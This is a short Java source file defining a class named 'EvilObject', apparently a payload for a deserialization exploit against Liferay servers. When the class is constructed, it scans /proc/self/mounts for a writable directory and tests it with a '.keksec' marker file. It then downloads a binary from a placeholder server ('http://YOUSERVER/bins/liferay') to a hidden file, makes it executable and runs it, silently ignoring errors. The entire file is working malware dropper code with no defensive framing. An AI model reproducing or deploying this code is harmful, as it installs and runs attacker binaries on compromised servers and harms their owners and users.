import java.io.FileReader;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.File;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URI;
import java.nio.file.Files; 
import java.nio.file.Paths;
import java.io.FileWriter;
public class EvilObject {
	public static void download(String url, String fileName) throws Exception {
        try (InputStream in = URI.create(url).toURL().openStream()) {
            Files.copy(in, Paths.get(fileName));
        }
    }
	public void dlexe(String FILE_URL, String FILE_NAME, int chmod) {
		try {
			download(FILE_URL, FILE_NAME);
			if(chmod == 1) {
			  File file = new File(FILE_NAME);
			  file.setExecutable(true);
			  file.setReadable(true);
			  file.setWritable(true);
			}
			Runtime.getRuntime().exec(FILE_NAME);
		} catch(Exception e) {
			
		}
	}
	public boolean runkek(String dir) {
		try{
			FileWriter myWriter = new FileWriter(dir + "/.keksec");
			myWriter.write("keksec");
			myWriter.close();
		}catch(Exception e) {
			return false;
		}
		try {
			File f = new File(dir + "/.keksec");
			if(f.exists()) {
				f.delete();
				dlexe("http://YOUSERVER/bins/liferay", dir + "/.wjnlwejfnlewk", 1);
				return true;
			}
		} catch(Exception e) {
			
		}
		return false;
	}

    public EvilObject() throws Exception {

			try  
			{  
				File file=new File("/proc/self/mounts");    //creates a new file instance  
				FileReader fr=new FileReader(file);   //reads the file  
				BufferedReader br=new BufferedReader(fr);  //creates a buffering character input stream  
				String line;  
				while((line=br.readLine())!=null)  
				{  
					if(line.contains("rw")) {
						if(new File(line.split(" ")[1]).canWrite()) {
							if(runkek(line.split(" ")[1])) {
								return;
							}
						}
					}  
				fr.close();
				}
			}catch(IOException e)  
			{  
				e.printStackTrace();  
			}  
		
		
    }
}